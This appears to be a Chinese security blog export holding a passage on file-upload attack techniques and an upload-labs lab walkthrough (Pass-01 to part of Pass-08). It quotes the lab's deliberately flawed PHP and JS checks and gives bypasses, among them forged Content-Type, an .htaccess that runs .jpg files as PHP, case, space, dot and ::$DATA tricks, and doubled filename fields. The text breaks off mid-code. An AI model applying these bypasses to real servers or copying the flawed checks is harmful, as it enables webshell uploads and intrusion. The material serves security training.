<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-16.png" alt="up-16"></p>
<p>中bp抓包，文件中加入已url编码的<code>%ff%d8%ff</code></p>
<p>上传过程<img src="//choge.top/2020/02/29/文件上传高级利用/up-17.png" alt="up-17"></p>
<p>讲<code>%ff%d8%ff</code>进行urldecode</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-18.png" alt="up-18"></p>
<p>可成功上传</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-19.png" alt="up-19"></p>
<h4 id="双写filename"><a href="#双写filename" class="headerlink" title="双写filename"></a>双写filename</h4><p>部分waf会监测第一个filename中的内容，而忽略第二个filename内容</p>
<p><img src="//choge.top/2020/02/29/文件上传高级利用/up-0.png" alt="up-0"></p>
<p><em>注</em>：<code>filename=&quot;oh-info.png&quot;;</code>之后加一个空格再跟上第二个filename</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>网易云课堂/i春秋</p>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>upload</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs记录</title>
    <url>/2020/02/24/upload-labs%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>本文主要记录upload-labs的通关技巧（转自网络），方便实战中查阅，同时记录下文件上传的高级利用</p><h2 id="upload-labs通关技巧"><a href="#upload-labs通关技巧" class="headerlink" title="upload-labs通关技巧"></a>upload-labs通关技巧</h2><h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fc0ny1%2Fupload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p><h3 id="思维导图总结"><a href="#思维导图总结" class="headerlink" title="思维导图总结"></a>思维导图总结</h3><p><img src="//choge.top/2020/02/24/upload-labs记录/up-1.png" alt="up-1"></p><p>###Pass-01-前端js检查</p><h4 id="探测验证点"><a href="#探测验证点" class="headerlink" title="探测验证点"></a>探测验证点</h4><ol>
<li>首先打开burp和浏览器</li>
<li>上传1.php文件进行观察</li>
<li>这里发现，http请求都没通过burp就弹出了不允许上传的提示框，这表明验证点在前端，而不在服务端</li>
</ol><a id="more"></a>




<p><img src="//choge.top/2020/02/24/upload-labs记录/up-2.png" alt="up-2"></p>
<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>判断了验证点在前端之后，就可以查看具体js判断代码。于是按F12,找到判断代码。</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-3.png" alt="up-3"></p>
<p>具体代码如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，上传之前，通过js判断一下文件后缀是否为.jpg|.png|.gif,不是就不允许上传。</p>
<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>对于前端js验证的绕过方法较为简单，我们可以将要上传的php文件改后缀名为jpg|png|gif,绕过js验证后，再用burp更改上传请求。或者浏览器禁用js后进行上传。</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-4.png" alt="up-4"></p>
<h3 id="Pass-02-只检查Content-type"><a href="#Pass-02-只检查Content-type" class="headerlink" title="Pass-02-只检查Content-type"></a>Pass-02-只检查Content-type</h3><h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，后端php代码只对Content-Type进行了检查。</p>
<h4 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>在burp中更改Content-Type进行绕过即可。</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-5.png" alt="up-5"></p>
<h3 id="Pass-03黑名单绕过"><a href="#Pass-03黑名单绕过" class="headerlink" title="Pass-03黑名单绕过"></a>Pass-03黑名单绕过</h3><h4 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，服务器端做了一个黑名单过滤，过滤了 asp、aspx、php、jsp</p>
<h4 id="绕过方法-2"><a href="#绕过方法-2" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>不允许上传.asp,.aspx,.php,.jsp后缀文件，但是可以上传其他任意后缀。比如说:<code>.phtml .phps .php5 .pht</code>，但如果上传的是.php5这种类型文件的话，如果想要被当成php执行的话，需要有个前提条件，即Apache的httpd.conf有如下配置代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure>

<p>关于AddType命令的作用解释如下</p>
<blockquote>
<p>AddType 指令<br>作用：在给定的文件扩展名与特定的内容类型之间建立映射<br>语法：AddType MIME-type extension [extension] …<br>AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。<br>AddType 是与类型表相关的，描述的是扩展名与文件类型之间的关系。</p>
</blockquote>
<p>此处黑名单没有过滤.htaccess后缀，故此处也可上传.htaccess文件进行绕过。<br><em>注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All</em></p>
<blockquote>
<p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。</p>
</blockquote>
<p>构造.htaccess文件，内容如下:<code>AddType application/x-httpd-php .jpg</code><br>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们可以把要上传的php文件的后缀名改为.jpg格式从而绕过</p>
<h3 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04 .htaccess绕过"></a>Pass-04 .htaccess绕过</h3><h4 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，黑名单里php、php5等这种后缀全部不允许上传，但并没有限制.htaccsess文件。故可以上传.htaccsess文件绕过。</p>
<h4 id="绕过方法-3"><a href="#绕过方法-3" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>同上Pass-03，利用.htaccsess文件。</p>
<h3 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h3><h4 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，此处的黑名单比Pass-04多了.htaccess，所有不能通过.htaccsess进行绕过了。但此处代码没有将文件名统一转成小写，故可以通过大小写绕过。</p>
<h4 id="绕过方法-4"><a href="#绕过方法-4" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>用burp将后缀改为大写PHP即可。</p>
<p><img src="//choge.top/2020/02/24/upload-labs记录/up-6.png" alt="up-6"></p>
<h3 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h3><h4 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，相比于上面Pass-05代码，这里将文件后缀名统一进行了小写转换，但是没有去除文件名首尾的空格。所以此处可以利用windows系统的命名规则进行绕过。</p>
<blockquote>
<p>Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点<br> 此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个.php[空格]文件即可</p>
</blockquote>
<h4 id="绕过方法-5"><a href="#绕过方法-5" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>修改文件后缀为<code>1.php .</code>这种形式，从代码执行流程分析来看，会先去除文件名末尾的.,去除之后的文件后缀是 .php[空格]，利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格和.,达到上传.php的目的。</p>
<h3 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h3><h4 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从代码上看，可以发现相比于Pass-06代码，加上了首尾去空，但是却少了尾部去点。故和上面Pass-06一样，利用windows文件命名规则绕过。</p>
<h4 id="绕过方法-6"><a href="#绕过方法-6" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>用burp将上传文件后缀改为.php.即可，详细原理与Pass-06类似</p>
<h3 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08 ::$DATA绕过"></a>Pass-08 ::$DATA绕过</h3><h4 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span 